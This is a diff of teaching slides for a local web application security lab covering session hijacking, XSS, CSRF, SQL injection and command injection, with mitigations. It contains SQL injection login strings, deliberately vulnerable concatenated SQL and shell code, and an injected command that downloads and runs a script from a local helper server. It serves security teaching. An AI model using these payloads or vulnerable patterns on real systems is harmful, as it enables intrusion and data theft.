@@ -6,7 +6,29 @@ lang: en
 title: Web Application Security Programming
 ---
 
-<!-- Slide 01 -->
+# Web Application Security Implementation Lab
+
+Local experiments for seeing where web application boundaries break.
+
+- Observe vulnerability behavior in a local environment
+- Connect each observation to a defensive implementation
+- Break down countermeasures from attacker, developer, and operator perspectives
+- Repository: `https://github.com/koide55/webapp-security-programming-handson`
+
+---
+
+# Why We Need Experiments
+
+1. Know
+   - Understand what kinds of input and requests attackers use.
+2. Observe
+   - Watch the moment dangerous boundaries break in Cookie, HTML, SQL, and shell contexts.
+3. Prevent
+   - Understand the difference between "working code" and "safe code" at implementation level.
+
+This exercise is for defensive learning only. Do not use it on public servers or third-party services.
+
+---
 
 # Web Application Security Programming
 
@@ -17,8 +39,6 @@ title: Web Application Security Programming
 
 ---
 
-<!-- Slide 02 -->
-
 # Web Server Security
 
 - Understand what kinds of input and requests attackers use
@@ -27,20 +47,6 @@ title: Web Application Security Programming
 - This exercise is for defensive learning only; do not use it on public servers or third-party services
 
 ---
-
-<!-- Slide 03 -->
-
-# Web App Lab Environment
-
-- Bottle: lightweight web framework
-- Peewee: ORM for Python
-- SQLite: local SQL database
-- Helper server: local XSS, CSRF, and dummy-payload experiments
-- Clone from GitHub and run with a Python virtual environment or Docker
-
----
-
-<!-- Slide 04 -->
 
 # Preparation: VS Code and Terminal
 
@@ -54,7 +60,45 @@ Experienced participants may use their preferred editor, but instructor demos as
 
 ---
 
-<!-- Slide 05 -->
+# Web App Lab Environment
+
+- Bottle: lightweight web framework
+- Peewee: ORM for Python
+- SQLite: local SQL database
+- Helper server: local XSS, CSRF, and dummy-payload experiments
+- Clone from GitHub and run with a Python virtual environment or Docker
+
+---
+
+# Web App Lab Environment
+
+- Bottle
+  - Lightweight web framework
+  - `http://bottlepy.org/docs/dev/`
+- Peewee
+  - ORM for Python
+  - `http://docs.peewee-orm.com/en/latest/`
+- SQLite
+  - SQL database engine
+
+We use only these tools to build a lab for web application vulnerability experiments.
+
+---
+
+# Frameworks We Use Here
+
+- Bottle
+  - Lightweight web application framework
+  - `http://bottlepy.org/docs/dev/`
+- Peewee
+  - ORM mapper
+  - `http://docs.peewee-orm.com/en/latest/`
+- SQLite
+  - SQL database engine
+
+We use these frameworks and tools to build an experimental system for learning web application vulnerabilities.
+
+---
 
 # Frameworks We Use Here
 
@@ -65,8 +109,6 @@ Experienced participants may use their preferred editor, but instructor demos as
 - All experiments run on `localhost`
 
 ---
-
-<!-- Slide 06 -->
 
 # Exercise 1: Try Bottle
 
@@ -79,8 +121,6 @@ Experienced participants may use their preferred editor, but instructor demos as
 Point: a URL path parameter is passed into a Python function and rendered as HTML.
 
 ---
-
-<!-- Slide 07 -->
 
 # Exercise 1: Original Bottle Code
 
@@ -100,8 +140,6 @@ run(host='0.0.0.0', port=8089)
 
 ---
 
-<!-- Slide 08 -->
-
 # Exercise 1: Run the App
 
 ```bash
@@ -118,7 +156,31 @@ python app/main.py --reset-db
 
 ---
 
-<!-- Slide 09 -->
+# Exercise 1: Bottle Walkthrough
+
+1. Start Python and enter the Bottle sample code.
+2. Open the URL in a browser and confirm the response.
+
+Key annotations:
+
+- A GET request such as `/hello/something` invokes the routed method.
+- The template creates the HTML returned to the browser.
+- `run(host='0.0.0.0', port=8089)` starts the server loop.
+- Entering a URL in the browser triggers the route and returns the result.
+
+---
+
+# Ex 1: Try Bottle
+
+Launch Python and input the sample code.
+
+- When a GET `/hello/something` request is sent, the next method is executed.
+- The template creates the HTML returned to the browser.
+- The web server main loop waits for requests.
+- Enter a URL in the browser.
+- Confirm that the response is returned.
+
+---
 
 # Exercise 2: Try Peewee and SQLite
 
@@ -131,8 +193,6 @@ python app/main.py --reset-db
   - `bob` / `bob123`
 
 ---
-
-<!-- Slide 10 -->
 
 # Exercise 2: Original Peewee Code
 
@@ -159,8 +219,6 @@ Users(username='hirosk', password='1234').save()
 
 ---
 
-<!-- Slide 11 -->
-
 # Exercise 2: Inspect SQLite
 
 ```bash
@@ -178,8 +236,6 @@ select userid, username, password, cookie from users;
 
 ---
 
-<!-- Slide 12 -->
-
 # Exercise 2: Database Operations
 
 - Peewee query example:
@@ -191,8 +247,6 @@ select userid, username, password, cookie from users;
 
 ---
 
-<!-- Slide 13 -->
-
 # Exercise 2: Database Checkpoints
 
 - `Users` stores users, passwords, and cookie-related values
@@ -202,7 +256,58 @@ select userid, username, password, cookie from users;
 
 ---
 
-<!-- Slide 14 -->
+# Exercise 2: Insert Data with Peewee
+
+Flow in the original exercise:
+
+1. Write the model code.
+2. Run `python3.5 main.py`.
+3. Create a database instance.
+4. Connect to the database.
+5. Create tables corresponding to models.
+6. Create two user records and store them.
+
+In the current app, the same idea is handled by `initialize_database()`.
+
+---
+
+# Ex 2: Try Peewee and SQLite
+
+Original exercise flow:
+
+- Input code that inserts data.
+- Execute the script.
+- Create a database model.
+- Connect to the database.
+- Create tables corresponding to the model.
+- Create two sets of data and store them.
+- Create an instance of the database.
+
+---
+
+# Ex 2: Direct Database Access
+
+Original continuation:
+
+- Access the database directly.
+- Search data.
+- Create a database instance.
+- Define a model that maps a class to a table.
+- Connect to the database.
+- Look up a record whose username is `hirosk`.
+
+---
+
+# Exercise 2: Direct Database Checkpoints
+
+Using the SQLite command-line tool:
+
+- Check which tables are defined.
+- Display all rows in the `users` table.
+- Compare what the app model says with what SQLite actually stores.
+- Notice that the database does not know whether a stored password is safe.
+
+---
 
 # Session Hijacking Lab
 
@@ -212,8 +317,6 @@ select userid, username, password, cookie from users;
 - This chapter observes what cookies do and how to protect them
 
 ---
-
-<!-- Slide 15 -->
 
 # HTTP Review
 
@@ -231,8 +334,6 @@ What to observe:
 
 ---
 
-<!-- Slide 16 -->
-
 # HTTP Is Stateless
 
 - The first request and the second request are separate by default
@@ -242,7 +343,85 @@ What to observe:
 
 ---
 
-<!-- Slide 17 -->
+# HTTP and the Memory-Loss Problem
+
+- HTTP is stateless: every request is independent.
+- A password check on one page does not automatically identify the same user on later pages.
+- Web apps must build a stateful experience on top of stateless HTTP.
+- Cookies are the common bridge between stateless requests and login state.
+
+Core challenge: remember the user safely without trusting easily forged data.
+
+---
+
+# HTTP Review: Same Person Not Guaranteed
+
+- A browser sends an HTTP request.
+- A server returns an HTTP response.
+- Another page request is a new interaction.
+- Without a session mechanism, the server cannot assume it is the same user.
+
+Even if a password was correct once, later pages need a reliable way to identify the user.
+
+---
+
+# Stateless and Stateful Example
+
+- Stateless:
+  - Each request stands alone.
+  - The server does not remember past requests automatically.
+- Stateful:
+  - Past context affects the current response.
+  - Examples: login state, carts, posted content, user preferences.
+
+Reference: `http://yohei-y.blogspot.jp/2007/10/blog-post.html`
+
+---
+
+# HTTP Cookie (Session Management)
+
+1. After authentication succeeds, create and store a session ID.
+2. Attach the session ID to the HTTP response header.
+3. The browser stores the session ID.
+4. On later requests, the browser attaches the session ID.
+5. The server compares the received session ID with the server-managed value.
+
+If the values match, the server treats it as the same user.
+
+---
+
+# HTTP Cookie (Session Management)
+
+- Authentication alone is not enough for later requests.
+- A session ID connects later requests to the authenticated user.
+- The browser automatically sends the cookie to the same site.
+- The server must decide whether the session ID is valid.
+
+The session ID becomes sensitive authentication material.
+
+---
+
+# Session Hijacking
+
+- A user logs in and receives a session ID.
+- The browser stores the session ID.
+- If an attacker learns the session ID, the attacker can send it too.
+- The server may welcome the attacker as the original user.
+
+Session theft can bypass password authentication after login.
+
+---
+
+# Session Hijacking: If the ID Is Known
+
+- The password was correct once, so the server registered a session ID.
+- Later requests identify the user by session ID.
+- If someone else can obtain that ID, the server may not distinguish them.
+- The exercise shows this by copying cookie values between browsers.
+
+Question: what should the server and browser do to reduce the damage?
+
+---
 
 # Stateless and Stateful
 
@@ -256,8 +435,6 @@ What to observe:
 
 ---
 
-<!-- Slide 18 -->
-
 # HTTP Cookie and Session Management
 
 - After login, the server issues a session-related cookie
@@ -266,8 +443,6 @@ What to observe:
 - If the cookie is predictable, stolen, or poorly protected, the session can be abused
 
 ---
-
-<!-- Slide 19 -->
 
 # What Cookies Must Protect
 
@@ -281,8 +456,6 @@ What to observe:
 
 ---
 
-<!-- Slide 20 -->
-
 # Session Hijacking
 
 - A user logs in and receives a cookie
@@ -294,9 +467,7 @@ Key idea: password authentication can be bypassed after the session is stolen.
 
 ---
 
-<!-- Slide 21 -->
-
-# Session Hijacking
+# Session Hijacking: Exercise Focus
 
 - A cookie after successful login becomes proof of identity
 - Copying the cookie can reproduce login state in another browser
@@ -305,7 +476,31 @@ Key idea: password authentication can be bypassed after the session is stolen.
 
 ---
 
-<!-- Slide 22 -->
+# Cookie and Session Management
+
+Typical flow:
+
+1. The user logs in with ID and password.
+2. The server generates a session ID and returns it as a cookie.
+3. Later requests include the cookie automatically.
+4. The server uses the cookie to decide who the user is.
+
+Insight: if the cookie can be copied, the system may treat the copier as the user.
+
+---
+
+# Observation 1: Session Hijacking
+
+- Normal user:
+  - Sends a request with the correct cookie.
+  - Receives a personalized response.
+- Attacker:
+  - Sets and sends a stolen cookie.
+  - The server trusts the cookie and welcomes the attacker as the original user.
+
+Weakness: JavaScript-readable cookies and predictable session IDs can be critical risks.
+
+---
 
 # Training Web App
 
@@ -322,8 +517,6 @@ The teaching code is in GitHub:
 `https://github.com/koide55/webapp-security-programming-handson`
 
 ---
-
-<!-- Slide 23 -->
 
 # Code Structure
 
@@ -345,8 +538,6 @@ The repository includes the app, helper server, setup guide, and exercises.
 
 ---
 
-<!-- Slide 24 -->
-
 # Read the Code
 
 - `app/main.py`
@@ -359,8 +550,6 @@ The repository includes the app, helper server, setup guide, and exercises.
   - Student instructions and instructor notes
 
 ---
-
-<!-- Slide 25 -->
 
 # Database Configuration
 
@@ -380,8 +569,6 @@ class Users(BaseModel):
 
 ---
 
-<!-- Slide 26 -->
-
 # Sign Up
 
 Processing flow:
@@ -398,8 +585,6 @@ Observation points:
 
 ---
 
-<!-- Slide 27 -->
-
 # Login
 
 For the SQL injection exercise, the login implementation is intentionally vulnerable.
@@ -414,8 +599,6 @@ records = cursor.execute(sql)
 - The executed SQL is displayed so students can observe dangerous concatenation
 
 ---
-
-<!-- Slide 28 -->
 
 # Logout and MyPage
 
@@ -433,8 +616,6 @@ Discussion:
 
 ---
 
-<!-- Slide 29 -->
-
 # Exercise 3: Session Hijacking
 
 1. Log in as `koide` in a normal window
@@ -446,8 +627,6 @@ Discussion:
 Goal: understand that cookies represent login state.
 
 ---
-
-<!-- Slide 30 -->
 
 # Check Cookies in the Web App
 
@@ -467,8 +646,6 @@ Values to check:
 
 ---
 
-<!-- Slide 31 -->
-
 # Exercise 3 Advanced: Compare Signed Cookies
 
 Observe these lines in `app/main.py`:
@@ -486,8 +663,6 @@ Questions:
 
 ---
 
-<!-- Slide 32 -->
-
 # XSS Lab
 
 - A string posted to BBS is displayed as HTML
@@ -496,8 +671,6 @@ Questions:
 - The helper server gives us a local destination for the experiment
 
 ---
-
-<!-- Slide 33 -->
 
 # BBS 1/3: Routing
 
@@ -515,8 +688,6 @@ def bbs_form():
 
 ---
 
-<!-- Slide 34 -->
-
 # BBS 2/3: Posting
 
 ```python
@@ -533,8 +704,6 @@ def post_bbs():
 - The dangerous context appears when the value is displayed
 
 ---
-
-<!-- Slide 35 -->
 
 # BBS 3/3: Display
 
@@ -554,8 +723,6 @@ Safer direction:
 
 ---
 
-<!-- Slide 36 -->
-
 # Cross-Site Scripting Attack
 
 - The victim opens a trusted web page
@@ -567,8 +734,6 @@ Important: the script runs because the trusted site reflected or stored unsafe i
 
 ---
 
-<!-- Slide 37 -->
-
 # Cross-Site Scripting
 
 - Attacker-controlled script is mixed into a site the user trusts
@@ -578,7 +743,40 @@ Important: the script runs because the trusted site reflected or stored unsafe i
 
 ---
 
-<!-- Slide 38 -->
+# Observation 2: Cross-Site Scripting
+
+Flow:
+
+1. Input: a comment contains `<script>...`.
+2. Storage: the app saves the comment without neutralizing it.
+3. Execution: the victim's browser renders the stored comment as HTML.
+4. Helper server: the script sends cookie data to a local receiver.
+
+Root cause: output escaping was skipped, so data became executable code.
+
+---
+
+# Cross-Site Scripting Attack
+
+- The user often visits a trusted web site.
+- An attacker prepares a malicious site or payload.
+- A malicious script is stored or reflected by the trusted site.
+- Private information or actions may be sent to the attacker's site.
+
+The browser executes the script in the trusted site's context.
+
+---
+
+# Cross-Site Scripting Attack Flow
+
+- Trusted site: the place the user expects to be safe.
+- Attacker-controlled script: the code mixed into the page.
+- Victim browser: executes the script.
+- Leakage: cookies, page content, or actions may be abused.
+
+Defensive focus: escape output for the correct context and reduce cookie exposure.
+
+---
 
 # Inspect the HTML
 
@@ -594,8 +792,6 @@ Discussion:
 - Are the mitigations the same for HTML, attributes, and JavaScript?
 
 ---
-
-<!-- Slide 39 -->
 
 # Simple Local Helper Server
 
@@ -613,8 +809,6 @@ python tools/attacker_server.py
 
 ---
 
-<!-- Slide 40 -->
-
 # A Simple Local Helper Site
 
 - Run `tools/attacker_server.py`
@@ -623,8 +817,6 @@ python tools/attacker_server.py
 - This helper is for local classroom experiments only
 
 ---
-
-<!-- Slide 41 -->
 
 # Reference: Delete Extra Comments
 
@@ -643,8 +835,6 @@ python app/main.py --reset-db --init-only
 
 ---
 
-<!-- Slide 42 -->
-
 # Exercise 4: XSS
 
 1. Log in to the web app and open BBS
@@ -660,8 +850,6 @@ python app/main.py --reset-db --init-only
 
 ---
 
-<!-- Slide 43 -->
-
 # Exercise 4 Advanced: Explain XSS
 
 Research and explain:
@@ -676,8 +864,6 @@ Summarize in a table: root cause, observed behavior, mitigation.
 
 ---
 
-<!-- Slide 44 -->
-
 # CSRF Lab
 
 - The browser automatically attaches cookies to requests for the target site
@@ -686,8 +872,6 @@ Summarize in a table: root cause, observed behavior, mitigation.
 - We observe this with BBS posting
 
 ---
-
-<!-- Slide 45 -->
 
 # Cross-Site Request Forgery
 
@@ -701,7 +885,27 @@ Mitigations: CSRF tokens, Origin/Referer checks, SameSite cookies.
 
 ---
 
-<!-- Slide 46 -->
+# Observation 3: Cross-Site Request Forgery
+
+Observed behavior:
+
+- A malicious page opened in another tab can trigger a POST to BBS.
+- The browser automatically attaches cookies for the target site.
+- The server receives a request that looks authenticated.
+
+Mitigation: verify that the request really came from a legitimate page using an unpredictable token.
+
+---
+
+# Cross-Site Request Forgery
+
+- The browser stores the session ID.
+- The user is lured to a malicious page.
+- The malicious page contains a form or script that submits to the legitimate site.
+- The browser automatically sends the legitimate site's cookie.
+- If the server does not verify the source, the action succeeds.
+
+---
 
 # Helper Server: CSRF Page
 
@@ -720,8 +924,6 @@ def csrf_page():
 
 ---
 
-<!-- Slide 47 -->
-
 # CSRF Page HTML
 
 ```html
@@ -737,8 +939,6 @@ def csrf_page():
 
 ---
 
-<!-- Slide 48 -->
-
 # Exercise 5: CSRF
 
 1. Start the web app
@@ -752,8 +952,6 @@ Discussion: why was the cookie sent even though the post came from another site?
 
 ---
 
-<!-- Slide 49 -->
-
 # SQL Injection Lab
 
 - Start from safe ORM usage, then observe dangerous string-concatenated SQL
@@ -763,7 +961,21 @@ Discussion: why was the cookie sent even though the post came from another site?
 
 ---
 
-<!-- Slide 50 -->
+# Observation 4: SQL Injection
+
+Example attack:
+
+```sql
+WHERE username='' or 'a'='a';
+```
+
+- `'a'='a'` is always true.
+- The password check logic is broken.
+- Data changed the structure of the SQL query.
+
+Insight: developer-intended logic can be rewritten by simple data when boundaries are not protected.
+
+---
 
 # Deliberately Vulnerable Design
 
@@ -781,8 +993,6 @@ Dangerous direction for the exercise:
 
 ---
 
-<!-- Slide 51 -->
-
 # Make Login Vulnerable
 
 ```python
@@ -799,16 +1009,17 @@ records = cursor.execute(sql)
 
 ---
 
-<!-- Slide 52 -->
-
 # Exercise 6: SQL Injection
 
 Try these on the login page:
 
-| username | password |
-| --- | --- |
-| `koide` | `' or 'a'='a` |
-| `koide' --` | `anything` |
+```text
+username: koide
+password: ' or 'a'='a
+
+username: koide' --
+password: anything
+```
 
 Check:
 
@@ -817,8 +1028,6 @@ Check:
 - What changes when placeholders are used
 
 ---
-
-<!-- Slide 53 -->
 
 # Command Injection Lab
 
@@ -829,7 +1038,19 @@ Check:
 
 ---
 
-<!-- Slide 54 -->
+# Observation 5: Command Injection
+
+Example boundary break:
+
+```sh
+echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py
+```
+
+- `;` ends the intended command and starts another command.
+- User input is interpreted as shell syntax, not as text.
+- The attacker-controlled command runs after the original command.
+
+---
 
 # Command Injection
 
@@ -843,8 +1064,6 @@ Dangerous flow:
 Point: as with SQLi and XSS, data is interpreted as code.
 
 ---
-
-<!-- Slide 55 -->
 
 # Boundary Between Data and Commands
 
@@ -861,8 +1080,6 @@ These are not just text for the shell. They have syntax meaning.
 Mitigation: avoid the shell, pass arguments as arrays, and use dedicated APIs.
 
 ---
-
-<!-- Slide 56 -->
 
 # Safer Implementation Thinking
 
@@ -886,8 +1103,6 @@ Better:
 
 ---
 
-<!-- Slide 57 -->
-
 # Vulnerable Contact Form
 
 ```python
@@ -900,8 +1115,6 @@ exit_code = os.system(command)
 - The exercise displays the executed command so the broken boundary is visible
 
 ---
-
-<!-- Slide 58 -->
 
 # Dummy Payload Distribution
 
@@ -919,8 +1132,6 @@ Path("badscript_ran.txt").write_text(
 
 ---
 
-<!-- Slide 59 -->
-
 # Preparation Check
 
 URLs:
@@ -937,8 +1148,6 @@ Files to check:
 - `badscript_ran.txt`
 
 ---
-
-<!-- Slide 60 -->
 
 # Observe Command Injection
 
@@ -958,8 +1167,6 @@ Do not run this outside the local exercise.
 
 ---
 
-<!-- Slide 61 -->
-
 # Command Injection Mitigations
 
 - Do not call a shell in the first place
@@ -970,8 +1177,6 @@ Do not run this outside the local exercise.
 - Log execution details and detect abnormal behavior
 
 ---
-
-<!-- Slide 62 -->
 
 # Exercise 7: Command Injection
 
@@ -988,7 +1193,27 @@ Discussion:
 
 ---
 
-<!-- Slide 63 -->
+# Integrated Matrix: Vulnerability Landscape
+
+- XSS: browser target; missing output escaping; defend with escaping and `HttpOnly`.
+- CSRF: browser-behavior target; missing request-origin verification; defend with tokens and `SameSite`.
+- SQL injection: database target; string-concatenated SQL; defend with placeholders and binding.
+- Command injection: OS/shell target; shell interpretation of input; defend by avoiding the shell.
+
+Synthesis insight: the shared root cause is a boundary failure where data is interpreted as code.
+
+---
+
+# Improve Visibility: UI and Security
+
+- Unstyled HTML can make vulnerability behavior hard to observe.
+- Structured UI makes inputs, errors, and navigation clearer.
+- Pico.css lets us improve visibility without adding a large UI framework.
+- Keep security logic and UI cleanup separated.
+
+Goal: make attack observation and defensive retesting easier for students.
+
+---
 
 # Clean Up the UI with Pico.css
 
@@ -999,8 +1224,6 @@ Discussion:
 
 ---
 
-<!-- Slide 64 -->
-
 # Why Pico.css
 
 - Start with one `link`
@@ -1010,8 +1233,6 @@ Discussion:
 - It keeps UI cleanup separate from security mitigations
 
 ---
-
-<!-- Slide 65 -->
 
 # Directory Layout
 
@@ -1033,8 +1254,6 @@ Sample code is in `examples/pico-css/`.
 
 ---
 
-<!-- Slide 66 -->
-
 # Add Static File Serving to main.py
 
 ```python
@@ -1054,8 +1273,6 @@ def login_form():
 ```
 
 ---
-
-<!-- Slide 67 -->
 
 # base.tpl
 
@@ -1077,8 +1294,6 @@ def login_form():
 ```
 
 ---
-
-<!-- Slide 68 -->
 
 # login.tpl
 
@@ -1102,8 +1317,6 @@ Pico.css styles form elements automatically.
 
 ---
 
-<!-- Slide 69 -->
-
 # Exercise 8: Improve the UI with Pico.css
 
 1. Review the sample in `examples/pico-css/`
@@ -1116,8 +1329,6 @@ Pico.css styles form elements automatically.
 Final goal: grow a working app into material that can explain security clearly.
 
 ---
-
-<!-- Slide 70 -->
 
 # Exercise 9: Fix Tasks
 
@@ -1132,7 +1343,33 @@ Implement these mitigations one at a time and confirm that the attack no longer 
 
 ---
 
-<!-- Slide 71 -->
+# Defensive Implementation: The Antidotes
+
+- SQLi:
+  - Stop string concatenation; use placeholders or ORM conditions.
+- XSS:
+  - Enable HTML escaping in template output.
+- Session protection:
+  - Add cookie attributes such as `HttpOnly` and `SameSite=Lax`.
+- CSRF:
+  - Generate unpredictable tokens and verify them on POST.
+- Command injection:
+  - Remove OS shell calls; use APIs or argument arrays.
+
+---
+
+# Deep Dive: Secure Password Storage
+
+Flow:
+
+1. Start with a cleartext password.
+2. Add a unique random salt.
+3. Run a slow password hashing algorithm such as PBKDF2, Argon2, or bcrypt.
+4. Store an encoded string that includes method, cost, salt, and hash.
+
+Problem: if the DB leaks, cleartext storage exposes all users immediately.
+
+---
 
 # Store Passwords as Hashes
 
@@ -1146,8 +1383,6 @@ At login time, fetch by username and verify the submitted password with `verify_
 
 ---
 
-<!-- Slide 72 -->
-
 # Separate Answers and Instructor Hints
 
 - Student exercises: `docs/exercises.en.md`
@@ -1159,8 +1394,6 @@ At login time, fetch by username and verify the submitted password with `verify_
 During the exercise, do not show answers immediately. Use instructor hints for gradual support.
 
 ---
-
-<!-- Slide 73 -->
 
 # Cleanup and Windows Support
 
@@ -1181,8 +1414,6 @@ py tools/clean.py
 
 ---
 
-<!-- Slide 74 -->
-
 # Wrap-up
 
 - Web app vulnerabilities often appear where input is interpreted in another context
@@ -1190,3 +1421,21 @@ py tools/clean.py
 - Observe first, then fix, so you can explain what the mitigation changes
 - End by summarizing root cause, observed behavior, and mitigation in a table
 
+---
+
+# Summary and Golden Rules
+
+Rule 1: understand the context.
+
+- Where will this data be interpreted: HTML, SQL, or OS shell?
+
+Rule 2: preserve the boundary between data and code.
+
+- Never treat user input as executable structure.
+- Use placeholders, escaping, and safe APIs.
+
+Rule 3: compensate for HTTP's stateless nature.
+
+- Use strict session management and request verification.
+
+Cleanup: stop the lab environment and run `py tools/clean.py`.
